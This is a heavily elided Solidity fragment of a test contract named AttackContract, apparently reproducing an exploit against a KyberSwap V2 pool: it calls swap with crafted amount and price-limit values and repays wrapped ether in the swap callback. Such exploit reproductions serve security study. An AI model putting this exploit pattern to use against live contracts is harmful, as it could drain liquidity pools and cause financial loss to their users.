...
contract AttackContract is Test {
        ...
        returns (bool)
    {
        ...
        Interfaces(KYBERSWAP_V2_REINVESTMENT_TOKEN).swap(
            address(this), 2000000000000000000000, false, 20282409603651670423947251286016, ""
        );
    ...
    function swapCallback(int256 deltaQty0, int256 deltaQty1, bytes calldata data) public {
        Interfaces(WRAPPED_ETHER).transfer(address(KYBERSWAP_V2_REINVESTMENT_TOKEN), 6849615814404497512);
